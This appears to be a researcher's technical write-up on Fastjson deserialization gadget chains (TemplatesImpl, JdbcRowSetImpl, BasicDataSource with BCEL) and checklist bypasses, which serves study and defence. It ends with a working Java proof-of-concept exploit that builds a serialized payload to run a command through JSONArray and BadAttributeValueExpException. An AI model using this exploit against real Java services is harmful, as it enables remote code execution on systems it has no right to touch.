# Fastjson deserialization

## Analysis

In `Fastjson`, when `AutoType` support is enabled, the `JSON.parse()` method deserializes the class specified by `@type` key to a json string, and the `JSON.parseObject()` method deserializes the json string to the class specified by the method parameter.

When creating a class instance, it will call the `setter` and `getter` methods that meet the conditions in the class through reflection. And it is just the source of the vulnerability.

## TemplatesImpl chain

The `getOutputProperties()` method of the `TemplatesImpl` class calls the `newTransformer()`, so it's obvious. However, we need to note that the `Fastjson` does not deserialize private properties by default. Therefore, it is necessary to enable `SupportNonPublicField` support in order to utilize this chain.

## JdbcRowSetImpl chain

The `setAutoCommit()` method of the `JdbcRowSetImpl` class calls the `connect()` method of the `Connection` class. In the `connect()` method, the `InitialContext.lookup()` method is called, which means the JNDI injection. And the `lookup()` method parameter is the `dataSource` field of the `JdbcRowSetImpl` class.

## BasicDataSource chain

The `getConnection()` method of the `BasicDataSource` class calls the `createDataSource()` method and then calls the `createConnectionFactory()` method. In the `createConnectionFactory()` method, `Class.forName(driverClassName, true, driverClassLoader)` method is called, so that the static code block in the class specified by `driverClassName` will be executed. Therefore, we can set the `driverClassLoader` to the BCEL Classloader and set the `driverClassName` to a string of malicious class bytecodes to load it through the BCEL Classloader.

### BCEL Classloader

The BCEL classloader can deserialize bytecodes into a class, which overrides the Java native `ClassLoader.loadClass()` method. In its `loadClass()` method, it first checks if this string of bytecodes starts with the `$$BCEL$$` string, and if so, subsequent bytecodes will be decoded.

## Fastjson-1.2.47

In the `fastjson-1.2.47`, it doesn't just set the whitelist and blacklist to filter the types of deserialized classes. And if the class is in the blacklist, it will lookup the corresponding class from `TypeUtils.mappings` and `deserializers`. However it can be exploited to bypass the whitelist and blacklist.

If the `@type` key is the `Class`, it will be handled through `MiscCodec.deserialze()` and the corresponding value will be the parameter of the `TypeUtils.loadClass()` to be called. In the `loadClass()` method, the value will be added into the `TypeUtils.mappings`.

Therefore, set the value to the evil class name, so that we can load the evil class to bypass the whitelist and blacklist.

## Native deserialization

Native deserialization refers to the use of Java native deserialization `ObjectOutputStream.writeObject()` as the source to trigger deserialization vulnerabilities.

In `Fastjson`, the `JSONArray` class inherits the Serializable interface, and has a `toString()` method. In that method, the `toJSONString()` method will be called, which in turn triggers the `getter` method of the specified class. Therefore, we can trigger a deserialization vulnerability by calling the `toString()` method of the `JSONArray` class from the `readObject()` method of the `BadAttributeValueExpException` class.

However, starting from `Fastjson-1.2.49`, the `JSONArray` class has implemented the `readObject()` method, which checks the type of the class to be deserialized by calling the `SecureObjectInputStream.resolveClass()` method. Fortunately, due to incorrect coding, deserializing the `Reference` class can bypass the call to the `resolveClass()` method.  At the same time, when adding the same object to the `List`, `Set`, and `Map` classes, the duplicated object will be written as the `Reference` class.

### Code

```java
import com.alibaba.fastjson.JSONArray;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Exp {
    public static void main(String[] args) throws Exception {
        Object template = Gadgets.createTemplatesImpl("calc");

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field declaredField = badAttributeValueExpException.getClass().getDeclaredField("val");
        Reflections.setAccessible(declaredField);
        declaredField.set(badAttributeValueExpException, jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}
```